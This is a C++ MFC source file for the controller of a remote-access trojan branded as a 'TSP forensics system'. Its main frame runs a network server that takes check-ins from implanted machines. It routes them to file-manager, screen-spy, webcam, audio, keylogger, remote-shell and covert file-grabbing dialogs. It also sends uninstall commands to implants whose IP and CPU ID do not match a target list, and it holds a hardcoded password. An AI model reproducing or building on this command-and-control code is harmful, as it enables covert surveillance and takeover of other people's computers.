// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "TSPClientPublic.h"
#include "TSPClient.h"

#include "MainFrm.h"
#include "TSPClientView.h"
#include "FileManagerDlg.h"
#include "FileManagerAuto.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "DlgSecretGet.h"
#include "Log.h"
#include "PluginConfig.h"

extern CLog g_log;
extern CLog g_logErr;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CTSPClientView* g_pConnectView = NULL; //在NotifyProc中初始化
//extern CWriteLog m_FileLog;
CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // 在CMainFrame::CMainFrame()中初始化


extern DWORD g_BeginTickCount;

UINT CMainFrame::m_nTaskCreatedMSG = ::RegisterWindowMessage(_T("TaskbarCreated"));
UINT CMainFrame::m_nTaskTrayNotify = WM_USER+100;
extern HANDLE g_hEventQuit;
/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_HIDE, OnHide)
	ON_COMMAND(IDM_EXIT, OnExit)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT,
	ID_STAUTLINE
};
/////////////////////////////////////////////////////////////////////////////

void My_GetTime(char Rstr[])
{
	time_t curtime=time(0);
	tm tim = *localtime(&curtime);
	int day,mon,year,hour,minute,seconds;
	day = tim.tm_mday;
	mon = tim.tm_mon;
	year = tim.tm_year;
	hour = tim.tm_hour;
	minute = tim.tm_min;
	seconds = tim.tm_sec;

	year += 1900;
	mon += 1;
	wsprintf( Rstr, "[当前时间:%04d年%02d月%02d日 %02d时%02d分%02d秒]", year, mon, day, hour, minute, seconds );
}
/*
DWORD WINAPI Change_Time(LPVOID lparam)
{
	CStatusBar *pBar = (CStatusBar*)lparam;
	CString oldstr,newstr;
//	char strTime[128] = {0};
	char hostname[256]; 
	gethostname(hostname, sizeof(hostname));
	HOSTENT *host = gethostbyname(hostname);
	if (host != NULL)
	{ 
		for ( int i=0; ; i++ )
		{ 
			oldstr += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
			if ( host->h_addr_list[i] + host->h_length >= host->h_name )
				break;
			oldstr += "/";
		}
	}
	//枚举本机网卡IP
	while (1)
	{
		if (WAIT_OBJECT_0 == WaitForSingleObject(g_hEventQuit, 1000))
		{
			break;
		}
	//	My_GetTime(strTime);
		DWORD Minute=((GetTickCount()-g_BeginTickCount)/1000)/60;
		newstr.Format( "%s [运行时间%d小时%d分钟][文件版本%s]", oldstr.GetBuffer(0), Minute/60,Minute%60,g_FileVerName);
		pBar->SetPaneText(0, newstr);
	
		Sleep(1000);
	}
	return 0;
}
*/
/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction



CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
	
}

CMainFrame::~CMainFrame()
{
}

void  CMainFrame::UpdateToolBar()
{

	CRect   rect;
	SIZE   sizeButton,sizeImage,m_sizeMax;
	m_sizeMax.cx   =   0;
	m_sizeMax.cy   =   0;
	static   TCHAR   *TextTips[]=   {"文件","屏幕","键盘","命令","系统","摄像头","录音", "密取",""};//此句为添加 
	

	for(int i=0,x=0;i <m_wndFileToolBar.GetCount();i=i+2,x++)
	{
		if (TextTips[x]==""){
			break;
		}
		m_wndFileToolBar.SetButtonText(i,TextTips[x]);
		m_wndFileToolBar.GetItemRect(i,rect);
 		m_sizeMax.cx=__max(rect.Size().cx,m_sizeMax.cx);
 		m_sizeMax.cy=__max(rect.Size().cy,m_sizeMax.cy);

	}

	sizeButton.cx   =   m_sizeMax.cx;
	sizeButton.cy   =   m_sizeMax.cy;
	sizeImage.cx   =   m_sizeMax.cx-7;
	sizeImage.cy   =   m_sizeMax.cy-18;
	m_wndFileToolBar.SetSizes(sizeButton,sizeImage);
	m_wndFileToolBar.RedrawWindow();

}


int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	this->CenterWindow(CWnd::GetDesktopWindow());

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);
	m_wndStatusBar.SetPaneInfo(4, m_wndStatusBar.GetItemID(4), SBPS_NORMAL, 40);

	if(	!m_wndTab.Create
		(
		WS_CHILD | WS_VISIBLE | CTCS_AUTOHIDEBUTTONS | CTCS_TOOLTIPS | CTCS_DRAGMOVE | CTCS_LEFT,
		CRect(0, 0, 0, 23),
		this,
		IDC_TABCTRL
		)
		)
	{
		TRACE0("Failed to create tab control\n");
		return -1;
	}

	if(!m_wndFileToolBar.Create(this)||
		!m_wndFileToolBar.LoadToolBar(IDR_TOOLBAR1))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}
	m_wndFileToolBar.SetBarStyle(m_wndFileToolBar.GetBarStyle() |
		CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC);
	m_wndFileToolBar.ModifyStyle(0,TBSTYLE_FLAT);	//设置工具栏为平面格式


	CBitmap FileToolBarBitmap;
	FileToolBarBitmap.LoadBitmap(IDB_TOOL_MONDIS);
	m_FileToolBarImageList.Create(48,48,ILC_COLOR32|ILC_MASK,12,1);
	m_FileToolBarImageList.Add(&FileToolBarBitmap,RGB(0,0,0));
	m_wndFileToolBar.GetToolBarCtrl().SetImageList(&m_FileToolBarImageList);

	CBitmap FileToolBarHotBitmap;
	FileToolBarHotBitmap.LoadBitmap(IDB_TOOL_MONEN);
	m_FileToolBarHotImageList.Create(48,48,ILC_COLOR32|ILC_MASK,12,1);
	m_FileToolBarHotImageList.Add(&FileToolBarHotBitmap,RGB(0,0,0));
	m_wndFileToolBar.GetToolBarCtrl().SetHotImageList(&m_FileToolBarHotImageList);

	UpdateToolBar();



	m_wndFileToolBar.EnableDocking(CBRS_ALIGN_ANY);
	EnableDocking(CBRS_ALIGN_ANY);
//	DockControlBar(&m_wndFileToolBar);
	

	m_wndTab.SetDragCursors(AfxGetApp()->LoadStandardCursor(IDC_CROSS),NULL);
	m_wndTab.ModifyStyle(CTCS_LEFT, 0, 0);

	LOGFONT lf = {13, 0, 0, 0, FW_NORMAL, 0, 0, 0,
		DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS,
		DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "宋体"};    //设置字体为宋体
	m_wndTab.SetControlFont(lf, TRUE);

	m_TrayIcon.Create(this, 
		m_nTaskTrayNotify, 
		"TSP取证系统",
		AfxGetApp()->LoadIcon(IDR_MAINFRAME), 
		IDR_MINIMIZE, 
		TRUE); //构造
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.cx = 900;
	/*
	if (((CTSPClientApp *)AfxGetApp())->m_bIsQQwryExist)//如果存在IP数据库则增加100
	{
		cs.cx += 100;
	}
	*/
	cs.cy = 500;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.lpszName = "RUN TSP取证系统";
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{

		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// 对g_pConnectView 进行初始化
		//g_pConnectView = (CTSPClientView *)((CTSPClientApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView还没创建，这情况不会发生
		//if (((CTSPClientApp *)AfxGetApp())->m_pConnectView == NULL)
		//	return;

		g_pConnectView->m_iocpServer = m_iocpServer;
		str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		g_pFrame->m_wndStatusBar.SetPaneText(1, str);

//		dprintf(("NotifyProc  %d",nCode));

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->SendMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}

}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器
 	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{
	//	m_ThreadChangeTime=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Change_Time, (LPVOID)&m_wndStatusBar, 0, NULL);
 //		m_wndStatusBar.SetPaneText(0, str);
 		str.Format("端口: %d", nPort);
 		m_wndStatusBar.SetPaneText(2, str);
 	}
 	else
 	{
 		str.Format("端口%d绑定失败", nPort);
 		m_wndStatusBar.SetPaneText(0, str);
 		m_wndStatusBar.SetPaneText(2, "端口: 0");
 	}

	m_wndStatusBar.SetPaneText(3, "连接: 0");
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	//dprintf(("CMainFrame  %d",pContext->m_DeCompressionBuffer.GetBuffer(0)[0]));

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])

		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case FILEMANAGER_AUTO:
			((CFileManagerAuto *)dlg)->OnReceiveComplete();
			break;
		case SECRET_GET:
			((CDlgSecretGet *)dlg)->OnReceiveComplete();
			break;
			
		default:
			break;
		}
		return;
	}

	BYTE bToken;
	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
/*
	case TOKEN_AUTH: // 要求验证
		{
			AfxMessageBox("要求验证1");
			BYTE	*bToken = new BYTE[ m_PassWord.GetLength() + 2 ];//COMMAND_ACTIVED;
			bToken[0] = TOKEN_AUTH;
			memcpy( bToken + 1, m_PassWord, m_PassWord.GetLength() );
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
			delete[] bToken;
//			m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		}
		break;
*/
	case TOKEN_HEARTBEAT: // 回复心跳包
		{

#ifdef _MYDEBUG1

				g_log.Log(0,"%08x::%08x---心跳包\n",GetCurrentThreadId(),pContext->m_Socket);
#endif
			bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		
			//LOG((LEVEL_INFO,"SendMessage TOKEN_HEARTBEAT\n"));
			g_pConnectView->SendMessage(WM_HEARTBEAT, 0, (LPARAM)pContext);  //by menglz 注释

			//LOG((LEVEL_INFO,"SendMessage TOKEN_HEARTBEAT end....\n"));



			//g_pConnectView->PostMessage(WM_HEARTBEAT, 0, (LPARAM)pContext);  //by menglz 注释


#ifdef _MYDEBUG1

			g_log.Log(0,"心跳包处理完毕\n");
#endif


		}
 		break;
	case TOKEN_LOGIN_FALSE: // 上线包
		{
			g_log.Log(0,"%08x::%08x---TOKEN_LOGIN_FALSE包\n",GetCurrentThreadId(),pContext->m_Socket);

				if (m_iocpServer->m_nMaxConnections <=(UINT)g_pConnectView->GetListCtrl().GetItemCount())
				{
					closesocket(pContext->m_Socket);
				}
				else
				{
					pContext->m_bIsMainSocket = TRUE;
	//				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
					LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_FALSE\n"));
					g_pConnectView->SendMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
					LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_FALSE end....\n"));
				}

			return;
		}
	case TOKEN_LOGIN_TRUE: // 上线包
		{
			g_log.Log(0,"%08x::%08x---TOKEN_LOGIN_TRUE包\n",GetCurrentThreadId(),pContext->m_Socket);

				if (m_iocpServer->m_nMaxConnections <=(UINT)g_pConnectView->GetListCtrl().GetItemCount())
				{
					closesocket(pContext->m_Socket);
				}
				else
				{
					LOGININFO *pLogin=(LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
#ifdef _MYDEBUG1

					g_log.Log(0,"\t %08x\n",pContext);
					g_log.Log(0,"\t HostName=%s\n",pLogin->HostName);
					g_log.Log(0,"\t CPUID=%s\n",pLogin->szCPUID);
#endif		
					//----------------------------------------
					sockaddr_in  sockAddr = {0};
					int nSockAddrLen = sizeof(sockAddr);
					BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
					char *pIpWan = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
#ifdef _MYDEBUG
					g_log.Log(0,"\t 外网Ip=%s\n",pIpWan);
#endif
					if(pIpWan)
					{
						if (((CTSPClientApp *)AfxGetApp())->m_filterUnknown)
						{
							if(g_pConnectView->MapClue(pIpWan,(char*)pLogin->szCPUID))
							{
								pContext->m_bIsMainSocket = TRUE;
#ifdef _MYDEBUG
								g_log.Log(0,"\t 线索匹配\n");

								LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_TRUE\n"));

#endif		
								g_pConnectView->SendMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
								LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_TRUE end....\n"));

							}else
							{
								//卸载服务器
								LOG((LEVEL_INFO,"线索未能匹配，发送卸载命令\n"));
								BYTE	bToken = COMMAND_REMOVE;
								m_iocpServer->Send(pContext, &bToken, sizeof(BYTE));

								g_log.Log(0,"线索未能匹配，正在关闭连接(%08x,%08x)\n",pContext,pContext->m_Socket);
								m_iocpServer->RemoveStaleClient(pContext,FALSE,FALSE);
								return;
							}
						}else
						{
								pContext->m_bIsMainSocket = TRUE;
								LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_TRUE2222\n"));

								g_pConnectView->SendMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
								LOG((LEVEL_INFO,"SendMessage TOKEN_LOGIN_TRUE22222222 end....\n"));

						}
					}
	
#ifdef _MYDEBUG
				g_log.Log(0,"\t 结束处理上线包\n");
#endif	
				}
			}




		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_EVIDENCE_CREATE: // 密取主动回传
		CFileManagerAuto *pFile;
// 		if (pContext->m_Dialog[0]==FILEMANAGER_AUTO)
// 		{
// 			delete (CFileManagerAuto *)(pContext->m_Dialog[1]);
// 		}
		pFile= new CFileManagerAuto(NULL, m_iocpServer, pContext);
		pContext->m_Dialog[0] = FILEMANAGER_AUTO;
		pContext->m_Dialog[1] = (int)pFile;

		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);		
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_EVIDENCE_STATE:
		g_pConnectView->PostMessage(WM_OPENSERECTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PLUGIN_REQUEST:
		g_pConnectView->PostMessage(WM_PLUGIN_REQUEST, 0, (LPARAM)pContext);
		break;
	
	case TOKEN_REPLY_REMOVE:
		//控制端收到卸载应答包，清理连接

		LOG((LEVEL_INFO,"收到卸载应答包\n"));		
		// 清理TSP1.5各种文件信息中的记录
		g_pConnectView->SendMessage(WM_PLUGIN_REMOVE,0,(LPARAM)pContext);

		//删除这个链接，其实客户端下线会发送FIN,这个链接会由IOCP删除，直接这里调用将会在通讯部分产生警告错误，		
		//但是又需要这个函数去删除界面记录
		m_iocpServer->RemoveStaleClient(pContext,FALSE,TRUE);

		break;

	// 命令停止当前操作
	default:
	//	closesocket(pContext->m_Socket);
		break;
	}	
}

// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:

			LOG((LEVEL_INFO,"\t ProcessReceive...\n"));
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			LOG((LEVEL_INFO,"\t ProcessReceive...\n"));
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			LOG((LEVEL_INFO,"\t ProcessReceive...\n"));
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			LOG((LEVEL_INFO,"\t ProcessReceive...\n"));
			break;
		}
		return;
	}
}
void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	ShowWindow(SW_MINIMIZE);
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		ShowWindow(SW_MINIMIZE);
		ShowWindow(SW_HIDE);
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}
}
void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str;
	int Count=0;
	int Count1=0;
	g_pConnectView->SendMessage(WM_GET_ONLINE_NUMBER,(WPARAM)&Count1,NULL);
	g_pConnectView->SendMessage(WM_GET_ITEM_NUMBER,(WPARAM)&Count,NULL);
	str.Format("连接: %d/%d",Count1, Count);
	m_wndStatusBar.SetPaneText(3, str);
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here

	ShowWindow(SW_SHOW);
	::SetForegroundWindow(m_hWnd);
}

void CMainFrame::OnHide() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_MINIMIZE);
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here

	m_iocpServer->Shutdown();

	::SetEvent(g_hEventQuit);
	m_TrayIcon.RemoveIcon();
	//关闭线程

	CFrameWnd::OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
	m_TrayIcon.SetTooltipText(lpszText);
}

LRESULT CMainFrame::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (m_nTaskCreatedMSG == message)
	{
		//重建托盘图标
		m_TrayIcon.ShowIcon();

		return 0;
	}
	else if (m_nTaskTrayNotify == message)
	{
		if (LOWORD(lParam) == WM_LBUTTONDBLCLK)
		{
			ShowWindow(SW_SHOW);
			ShowWindow(SW_NORMAL);

			return 0;
		}

		//弹出右键菜单
		return m_TrayIcon.OnTrayNotification(wParam, lParam);
	}

	return CTabSDIFrameWnd::WindowProc(message, wParam, lParam);
}
